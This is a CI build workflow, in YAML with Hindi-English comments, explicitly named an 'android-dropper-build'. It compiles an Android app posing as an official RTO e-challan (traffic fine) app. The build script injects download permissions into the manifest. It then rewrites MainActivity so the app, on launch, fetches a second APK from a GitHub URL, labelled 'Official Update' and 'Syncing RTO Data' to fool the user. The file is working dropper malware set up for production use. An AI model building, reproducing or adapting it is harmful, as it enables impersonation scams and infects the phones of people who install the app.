workflows:
  android-dropper-build:
    name: RTO Final Production Master
    max_build_duration: 60
    instance_type: mac_mini_m2
    environment:
      java: 17
    scripts:
      - name: Force Project Locate & Build
        script: |
          # 1. Project Root Ko Force Find Karo (Fixes 11802.jpg)
          echo "Scanning for gradlew..."
          GRADLE_FILE=$(find . -name "gradlew" -not -path "*/.*" | head -n 1)
          
          if [ -z "$GRADLE_FILE" ]; then
            echo "Direct gradlew nahi mila, creation mode on..."
            # Agar gradlew nahi hai toh create kar rahe hain
            gradle wrapper --gradle-version 8.0.2
            GRADLE_FILE="./gradlew"
          fi
          
          ROOT_DIR=$(dirname "$GRADLE_FILE")
          cd "$ROOT_DIR"
          echo "Building in: $(pwd)"

          # 2. Manifest Permission Fix (Fixes 11798.jpg)
          find . -name "AndroidManifest.xml" -exec sed -i '' '/<application/i \
          <uses-permission android:name="android.permission.INTERNET" /> \
          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
          <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' {} +

          # 3. Background Download Logic
          FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
          if [ -n "$FILE_PATH" ]; then
          cat <<EOF > "$FILE_PATH"
          package com.example.rtoechallan
          import android.app.DownloadManager
          import android.content.Context
          import android.net.Uri
          import android.os.Bundle
          import android.os.Environment
          import android.widget.Toast
          import androidx.appcompat.app.AppCompatActivity

          class MainActivity : AppCompatActivity() {
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  setContentView(R.layout.activity_main)
                  val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                  try {
                      val request = DownloadManager.Request(Uri.parse(url))
                      request.setTitle("Official Update")
                      request.setDescription("Syncing RTO Data...")
                      request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Pro.apk")
                      (getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager).enqueue(request)
                      Toast.makeText(this, "Production Update Started...", Toast.LENGTH_LONG).show()
                  } catch (e: Exception) {
                      startActivity(android.content.Intent(android.content.Intent.ACTION_VIEW, Uri.parse(url)))
                  }
              }
          }
          EOF
          fi

          # 4. Final Release Build
          chmod +x gradlew
          ./gradlew assembleRelease --no-daemon
          
    artifacts:
      - "**/build/outputs/apk/release/*.apk"
